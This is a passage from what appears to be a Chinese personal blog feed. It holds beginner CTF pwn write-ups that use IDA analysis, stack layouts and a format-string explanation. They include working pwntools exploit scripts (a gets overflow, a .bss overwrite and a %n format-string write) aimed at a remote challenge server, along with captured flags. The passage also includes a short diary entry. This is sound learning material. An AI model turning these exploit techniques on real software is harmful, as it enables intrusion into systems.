else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;What&apos;s Your Name?&quot;);                  // 输入   v4 </span><br><span class="line">    gets(&amp;v4);                                  // gets()函数，无限输入   即此题的漏洞点</span><br><span class="line">    printf(&quot;You Are Born In %d\n&quot;, v5);</span><br><span class="line">    if ( v5 == 1926 )                           // else 之后又对v5 做检查， 所以需要v5=1926</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;You Shall Have Flag.&quot;);</span><br><span class="line">      system(&quot;cat flag&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;You Are Naive.&quot;);</span><br><span class="line">      puts(&quot;You Speed One Second Here.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    result = 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这个很重要，他们在栈中的位置，及相隔位置：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#v4 [rsp-0h] [rbp-20h]</span><br><span class="line">#v5 [rsp+8] [rbp-18h]</span><br></pre></td></tr></table></figure><blockquote><p>进去查看它的栈结构：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">-0000000000000020 ; D/A/*   : change type (data/ascii/array)</span><br><span class="line">-0000000000000020 ; N       : rename</span><br><span class="line">-0000000000000020 ; U       : undefine</span><br><span class="line">-0000000000000020 ; Use data definition commands to create local variables and function arguments.</span><br><span class="line">-0000000000000020 ; Two special fields &quot; r&quot; and &quot; s&quot; represent return address and saved registers.</span><br><span class="line">-0000000000000020 ; Frame size: 20; Saved regs: 8; Purge: 0</span><br><span class="line">-0000000000000020 ;</span><br><span class="line">-0000000000000020</span><br><span class="line">-0000000000000020 var_20          db ?//v4</span><br><span class="line">-000000000000001F                 db ? ; undefined</span><br><span class="line">-000000000000001E                 db ? ; undefined</span><br><span class="line">-000000000000001D                 db ? ; undefined</span><br><span class="line">-000000000000001C                 db ? ; undefined</span><br><span class="line">-000000000000001B                 db ? ; undefined</span><br><span class="line">-000000000000001A                 db ? ; undefined</span><br><span class="line">-0000000000000019                 db ? ; undefined</span><br><span class="line">-0000000000000018 var_18          dd ?//v5</span><br><span class="line">-0000000000000014                 db ? ; undefined</span><br><span class="line">-0000000000000013                 db ? ; undefined</span><br><span class="line">-0000000000000012                 db ? ; undefined</span><br><span class="line">-0000000000000011                 db ? ; undefined</span><br><span class="line">-0000000000000010                 db ? ; undefined</span><br><span class="line">-000000000000000F                 db ? ; undefined</span><br><span class="line">-000000000000000E                 db ? ; undefined</span><br><span class="line">-000000000000000D                 db ? ; undefined</span><br><span class="line">-000000000000000C                 db ? ; undefined</span><br><span class="line">-000000000000000B                 db ? ; undefined</span><br><span class="line">-000000000000000A                 db ? ; undefined</span><br><span class="line">-0000000000000009                 db ? ; undefined</span><br><span class="line">-0000000000000008 var_8           dq ?</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br><span class="line">+0000000000000010</span><br><span class="line">+0000000000000010 ; end of stack variables</span><br></pre></td></tr></table></figure><blockquote><p>分析：<br>我们现在将v4 与v5之间的8个字节给填充垃圾数据，然后再在v5位置写入1926即可</p></blockquote><blockquote><p>构造payload：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#v4 [rsp-0h] [rbp-20h]</span><br><span class="line">#v5 [rsp+8] [rbp-18h]</span><br><span class="line"></span><br><span class="line">payload=&apos;a&apos;*8+p64(1926)</span><br><span class="line"></span><br><span class="line">#conn=process(&apos;./when_did_you_born&apos;)</span><br><span class="line">conn=remote(&quot;111.198.29.45&quot;,&quot;33340&quot;)</span><br><span class="line">conn.recvuntil(&apos;irth?&apos;)</span><br><span class="line">conn.sendline(&apos;1999&apos;)</span><br><span class="line"></span><br><span class="line">print(p64(1926))</span><br><span class="line"></span><br><span class="line">conn.recvuntil(&apos;r Name?&apos;)</span><br><span class="line">conn.sendline(payload)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>运行，于是得到  flag：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;292b64bccafa1d70947a312f75f8062d&#125;</span><br></pre></td></tr></table></figure><h1 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h1><blockquote><p>检查文件属性及保护：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mutou@mutou-vm:~/下载$ file hello_pwn</span><br><span class="line">hello_pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=05ef7ecf06e02e7f199b11c4647880e8379e6ce0, stripped</span><br><span class="line">mutou@mutou-vm:~/下载$ checksec hello_pwn</span><br><span class="line">[*] &apos;/home/mutou/\xe4\xb8\x8b\xe8\xbd\xbd/hello_pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">mutou@mutou-vm:~/下载$</span><br></pre></td></tr></table></figure><blockquote><p>64位，小段模式，动态链接，然后开启了NX的保护，但是NX保护对.bss段不起作用！于是我们将它拖入ida   我们分析下流程（漏洞）：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  alarm(0x3Cu);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  puts(&quot;~~ welcome to ctf ~~     &quot;);</span><br><span class="line">  puts(&quot;lets get helloworld for bof&quot;);</span><br><span class="line">  read(0, &amp;unk_601068, 0x10uLL);                // 读入我们输入的 10个数  放在   unk_601068地址上</span><br><span class="line">  if ( dword_60106C == 1853186401 )             // 如果  dword_60106C==1853186401   即执行下面sub_400686()函数</span><br><span class="line">    sub_400686();                               // system(&quot;cat flag.txt&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们进入栈页面看下他们的偏移位置及相隔位置：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000601058                                         ; Copy of shared data</span><br><span class="line">.bss:0000000000601060 byte_601060     db ?                    ; DATA XREF: sub_400640↑r</span><br><span class="line">.bss:0000000000601060                                         ; sub_400640+13↑w</span><br><span class="line">.bss:0000000000601061                 align 8</span><br><span class="line">.bss:0000000000601068 unk_601068      db    ? ;               ; DATA XREF: main+3B↑o   //我们输入的数据存的地方</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.bss:0000000000601069                 db    ? ;</span><br><span class="line">.bss:000000000060106A                 db    ? ;</span><br><span class="line">.bss:000000000060106B                 db    ? ;</span><br><span class="line">.bss:000000000060106C dword_60106C    dd ?                    ; DATA XREF: main+4A↑r //进行 if判断的地方</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.bss:000000000060106C _bss            ends</span><br><span class="line">.bss:000000000060106C</span><br></pre></td></tr></table></figure><blockquote><p>分析：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unk_601068与dword_60106C相隔 4个字节 而unk_601068位置里的内容又必须是 1853186401 所以，我们输入4个随便数据用于填充，再输入p64(1853186401)覆盖为unk_601068地址所指的 内容</span><br></pre></td></tr></table></figure><blockquote><p>构造payload：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">payload=&apos;a&apos;*4+p64(1853186401)</span><br><span class="line"></span><br><span class="line">#conn=process(&apos;./hello_pwn&apos;)</span><br><span class="line">conn=remote(&apos;111.198.29.45&apos;,&apos;58758&apos;)</span><br><span class="line">conn.recvuntil(&quot;bof&quot;)</span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>运行于是得到  flag：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;1dac28964cc18d76ee232276c01315cd&#125;</span><br></pre></td></tr></table></figure><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><blockquote><p>不着急，慢慢来！</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">积土而为山，积水而为海。</span><br><span class="line">                                        ——《荀子•儒效》</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/09/27/uuZJj1.png" alt="uuZJj1.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我好想有点入门了，哈哈！接下来就是在虚拟机中安装或者使用vim与sublime了，接下来要做的事情！&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>疯狂的木头05</title>
    <link href="http://yoursite.com/2019/10/01/%E7%96%AF%E7%8B%82%E7%9A%84%E6%9C%A8%E5%A4%B405/"/>
    <id>http://yoursite.com/2019/10/01/疯狂的木头05/</id>
    <published>2019-10-01T14:49:27.000Z</published>
    <updated>2019-10-01T15:19:08.784Z</updated>
    
    <content type="html"><![CDATA[<p>越来越感到计划的必要性了，冲着一个目的去学，针对性很强，效率也便有了！</p><a id="more"></a><blockquote><p>最近状态:</p></blockquote><ol><li>嗯…最近状态极为不佳，万事皆有原因，不过不能以此空话作为我逃避的理由，状态不好就去找，心事压力什么的都暂时先收一收，抽个好时机再好好解决释放！</li><li>我今天就是原本想好好看看elf文件格式呢，看到一半又跑去看栈溢出漏洞（虽然它属于pwn中的hello，world，但也挺难的，当然是新入门的我来说的）目的不明确，注定两个都没能怎么把握！</li></ol><blockquote><p>今天国庆：</p></blockquote><ol><li>朋友圈被国庆刷屏了，很有气氛，但我没有看，然后我妈打电话说：给你一块的都回家了，你咋就不回来！因为我不甘呐，悟性不高，只能在时间上尽力去控住未来就业大局面！</li><li>成功之后的你才是最有魅力的！</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">只想赢，不想输，输不起！</span><br><span class="line">//来自一ctf友的QQ签名！</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/ZqpExx" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/07/16/ZqpExx.jpg" alt="ZqpExx.jpg"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;越来越感到计划的必要性了，冲着一个目的去学，针对性很强，效率也便有了！&lt;/p&gt;
    
    </summary>
    
    
      <category term="疯狂的木头" scheme="http://yoursite.com/tags/%E7%96%AF%E7%8B%82%E7%9A%84%E6%9C%A8%E5%A4%B4/"/>
    
  </entry>
  
  <entry>
    <title>国庆七天之pwn00</title>
    <link href="http://yoursite.com/2019/09/30/%E5%9B%BD%E5%BA%86%E4%B8%83%E5%A4%A9%E4%B9%8Bpwn00/"/>
    <id>http://yoursite.com/2019/09/30/国庆七天之pwn00/</id>
    <published>2019-09-30T13:10:46.000Z</published>
    <updated>2019-09-30T15:14:51.816Z</updated>
    
    <content type="html"><![CDATA[<p>pwn，入门难，进阶更难，早就听闻了，今天才是领略到了，说实话做得我有点一脸懵！</p><a id="more"></a><blockquote><p>pwn解题思路(by luobo)：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. checksec  filename</span><br><span class="line">2. IDA分析漏洞</span><br><span class="line">3. 利用漏洞-&gt;</span><br><span class="line">    - system(&quot;/bin/sh&quot;)</span><br><span class="line">    - One_gadget</span><br><span class="line">4. python               pwntools</span><br><span class="line">5.ida   gdb ROPgadget</span><br></pre></td></tr></table></figure><blockquote><p>我们这里拿攻防世界pwn新手区的cgfsb来练习下：</p></blockquote><h2 id="查看可执行文件属性（常见保护）："><a href="#查看可执行文件属性（常见保护）：" class="headerlink" title="查看可执行文件属性（常见保护）："></a>查看可执行文件属性（常见保护）：</h2><blockquote><p>具体可以参考这篇博客，很详细。<a href="https://www.cnblogs.com/Spider-spiders/p/8798628.html" target="_blank" rel="noopener">https://www.cnblogs.com/Spider-spiders/p/8798628.html</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mutou@mutou-vm:~/下载$ checksec cgfsb</span><br><span class="line">[*] &apos;/home/mutou/\xe4\xb8\x8b\xe8\xbd\xbd/cgfsb&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found      #开启了栈保护</span><br><span class="line">    NX:       NX enabled        #开启了NX保护</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">mutou@mutou-vm:~/下载$ </span><br><span class="line"></span><br><span class="line">mutou@mutou-vm:~/下载$ file cgfsb</span><br><span class="line">cgfsb: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=113a10b953bc39c6e182c4ce6e05582ba2f8017a, not stripped</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#这里我们可以看出是Intel 80386 32-bit程序 动态链接</span><br></pre></td></tr></table></figure><h2 id="IDA分析漏洞"><a href="#IDA分析漏洞" class="headerlink" title="IDA分析漏洞"></a>IDA分析漏洞</h2><blockquote><p>拖入IDA：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int buf; // [esp+1Eh] [ebp-7Eh]</span><br><span class="line">  int v5; // [esp+22h] [ebp-7Ah]</span><br><span class="line">  __int16 v6; // [esp+26h] [ebp-76h]</span><br><span class="line">  char s; // [esp+28h] [ebp-74h]</span><br><span class="line">  unsigned int v8; // [esp+8Ch] [ebp-10h]</span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(0x14u);</span><br><span class="line">  setbuf(stdin, 0);</span><br><span class="line">  setbuf(stdout, 0);</span><br><span class="line">  setbuf(stderr, 0);</span><br><span class="line">  buf = 0;</span><br><span class="line">  v5 = 0;</span><br><span class="line">  v6 = 0;</span><br><span class="line">  memset(&amp;s, 0, 0x64u);</span><br><span class="line">  puts(&quot;please tell me your name:&quot;);</span><br><span class="line">  read(0, &amp;buf, 0xAu);</span><br><span class="line">  puts(&quot;leave your message please:&quot;);</span><br><span class="line">  fgets(&amp;s, 100, stdin);</span><br><span class="line">  printf(&quot;hello %s&quot;, &amp;buf);</span><br><span class="line">  puts(&quot;your message is:&quot;);</span><br><span class="line">  printf(&amp;s);</span><br><span class="line">  //格式化漏洞，所以即使该程序开启了NX与栈保护,</span><br><span class="line">  //但我们其实利用的是格式化漏洞，不是栈溢出，都不需要绕过的！</span><br><span class="line">  if ( pwnme == 8 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;you pwned me, here is your flag:\n&quot;);</span><br><span class="line">    system(&quot;cat flag&quot;);</span><br><span class="line">    #pwnme = 8后执行该系统命令，我们的最终目的</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Thank you!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们这里首先要知道格式化字符串漏洞的原理:(不是完全懂)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">格式化字符串可以接受可变数量的参数，举个列子吧：</span><br><span class="line">比如我们常写的输出函数：printf(&quot;%s %s %S&quot;,a,b,c),双引号里面的相当于第一个参数：文件格式，后面的a,b,c（第2，3，4个）参数，我们称他们在参数列表中；</span><br><span class="line">当执行printf函数前，系统将参数表中的a，b，c参数按倒序的顺序放入栈中（由高地址到地址）然后将文件格式放入栈中，；</span><br><span class="line">开始执行printf函数，从（双引号里内容）左向右读取，</span><br><span class="line">遇到%s,便从参数表中的（栈中）第一个（顶）的数据所指地址中的数据按字符串格式输出，</span><br><span class="line">没遇到%s，就原样输出，</span><br><span class="line">再遇到就继续从参数表中自顶向上（高地址）取出数据所指地址中的数据按字符串格式输出。</span><br><span class="line"></span><br><span class="line">而printf(b)时,就会直接把b作为输出格式进行解析，所以，我们可以在b中写入格式化字符的话，系统该走的流程还是要执行的，即是栈上没有参数表，但格式化参数（此时为b）上面的栈中数据都可以看成参数表中的数据.</span><br><span class="line">大致是这个样子。</span><br></pre></td></tr></table></figure><blockquote><p>所以，这样就会非法访问栈中数据，甚至造成任意地址读写，很危险；<br>OK，明白了漏洞原理，这里我们看下这个程序，将pwnme==8就是我们的目的！</p></blockquote><h3 id="找下bbbb所在栈上位置"><a href="#找下bbbb所在栈上位置" class="headerlink" title="找下bbbb所在栈上位置"></a>找下bbbb所在栈上位置</h3><p>name我们输入   aaaa<br>message输入   bbbb%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x (12个%8x)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mutou@mutou-vm:~/下载$ ./cgfsb</span><br><span class="line">please tell me your name:</span><br><span class="line">aaaa</span><br><span class="line">leave your message please:</span><br><span class="line">bbbb.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x</span><br><span class="line">hello aaaa</span><br><span class="line">your message is:</span><br><span class="line">bbbb.ffcb14de.f7f3a5a0.00f0b5ff.ffcb150e.00000001.000000c2.616186bb.000a6161.00000000.62626262.3830252e.30252e78 #我们发现第十个参数是存着bbbb的指针，</span><br><span class="line">Thank you!</span><br><span class="line">mutou@mutou-vm:~/下载$</span><br></pre></td></tr></table></figure><p>我们再来了解下%n这个格式话字符串（来自网上）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">%c：輸出字符，配上%n可用於向指定地址寫數據。</span><br><span class="line"></span><br><span class="line">%d：輸出十進制整數，配上%n可用於向指定地址寫數據。</span><br><span class="line"></span><br><span class="line">%x：輸出16進制數據，如%i$x表示要泄漏偏移i處4字節長的16進制數據，%i$lx表示要泄漏偏移i處8字節長的16進制數據，32bit和64bit環境下一樣。</span><br><span class="line"></span><br><span class="line">%p：輸出16進制數據，與%x基本一樣，只是附加了前綴0x，在32bit下輸出4字節，在64bit下輸出8字節，可通過輸出字節的長度來判斷目標環境是32bit還是64bit。</span><br><span class="line"></span><br><span class="line">%s：輸出的內容是字符串，即將偏移處指針指向的字符串輸出，如%i$s表示輸出偏移i處地址所指向的字符串，在32bit和64bit環境下一樣，可用於讀取GOT表等信息。</span><br><span class="line"></span><br><span class="line">%n：將%n之前printf已經打印的字符個數賦值給偏移處指針所指向的地址位置，如%100×10$n表示將0x64寫入偏移10處保存的指針所指向的地址（4字節），而%$hn表示寫入的地址空間爲2字節，%$hhn表示寫入的地址空間爲1字節，%$lln表示寫入的地址空間爲8字節，在32bit和64bit環境下一樣。有時，直接寫4字節會導致程序崩潰或等候時間過長，可以通過%$hn或%$hhn來適時調整。</span><br></pre></td></tr></table></figure><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><blockquote><p>我们现在可以格式化字符串访问我们输入的 message，我们在借助于 %n这个格式化（向它对应的地址写入成功输出的字符数（字节）），向他对应的地址是  pwnme的地址，我们把pwnme的地址（在ida中双击查看即可我i这里是0804A068）放在bbbb处即可，因为  0804A068才四个字节，我们需要8个   在其后面+’a’*4就是成功输入8字节了，最后+’%10$n’，合在一起就是</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p32(pwnme)+&apos;a&apos;*4+&apos;%10$n&apos;</span><br><span class="line">//&apos;%10$n&apos;   10指第十个参数，或者说偏移量为10*4，就是将当前成功输出字符（字节）数赋值给这个参数（pwnme地址）对应的内容</span><br></pre></td></tr></table></figure><h2 id="python脚本："><a href="#python脚本：" class="headerlink" title="python脚本："></a>python脚本：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">pwnme=0x0804A068</span><br><span class="line">mutou=remote(&quot;111.198.29.45&quot;,50560)</span><br><span class="line"></span><br><span class="line">payloadname=&apos;aaaa&apos;</span><br><span class="line">payloadmess=p32(pwnme)+&apos;a&apos;*4+&apos;%10$n&apos;</span><br><span class="line"></span><br><span class="line">mutou.recvuntil(&apos;please tell me your name:&apos;)</span><br><span class="line">mutou.sendline(payloadname)</span><br><span class="line"></span><br><span class="line">mutou.recvuntil(&apos;leave your message please:&apos;)</span><br><span class="line">mutou.sendline(payloadmess)</span><br><span class="line"></span><br><span class="line">mutou.interactive()</span><br><span class="line">#pwntools 使用详见https://bbs.pediy.com/thread-247217.htm</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mutou@mutou-vm:~/下载$ python cgfsb.py</span><br><span class="line">[+] Opening connection to 111.198.29.45 on port 50560: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">hello aaaa</span><br><span class="line">your message is:</span><br><span class="line">h\xa0\x0aaaa</span><br><span class="line">you pwned me, here is your flag:</span><br><span class="line"></span><br><span class="line">cyberpeace&#123;1d5e7994e9896031cc3975f1538b832f&#125;</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$  [1]   已杀死               gedit cgfsb.py</span><br><span class="line"></span><br><span class="line">[2]+  已停止               python cgfsb.py</span><br><span class="line">mutou@mutou-vm:~/下载$</span><br></pre></td></tr></table></figure><blockquote><p>cyberpeace{1d5e7994e9896031cc3975f1538b832f}</p></blockquote><h2 id="怎么就理解不清呢，得找找原因！"><a href="#怎么就理解不清呢，得找找原因！" class="headerlink" title="怎么就理解不清呢，得找找原因！"></a>怎么就理解不清呢，得找找原因！</h2><p>参考链接：<a href="https://www.twblogs.net/a/5d6d7290bd9eee5327ff19cc" target="_blank" rel="noopener">https://www.twblogs.net/a/5d6d7290bd9eee5327ff19cc</a></p><p><img src="https://s2.ax1x.com/2019/09/27/uuZGcR.png" alt="uuZGcR.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;pwn，入门难，进阶更难，早就听闻了，今天才是领略到了，说实话做得我有点一脸懵！&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ZKCTF9月赛 easy_re</title>
    <link href="http://yoursite.com/2019/09/28/ZKCTF9%E6%9C%88%E8%B5%9B%20easy_re/"/>
    <id>http://yoursite.com/2019/09/28/ZKCTF9月赛 easy_re/</id>
    <published>2019-09-28T14:07:24.000Z</published>
    <updated>2019-09-28T14:42:26.169Z</updated>
    
    <content type="html"><![CDATA[<p>实验室每月举行比赛了，害怕又期待！认真学就好了！</p><a id="more"></a><h1 id="easy-re"><a href="#easy-re" class="headerlink" title="easy_re"></a>easy_re</h1><p> 这道题真的懂得话，会很简单，但我没有做过RC4的题，做题太少了。</p><h2 id="拖入ida"><a href="#拖入ida" class="headerlink" title="拖入ida"></a>拖入ida</h2><blockquote><p>代码还看着还很清晰：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 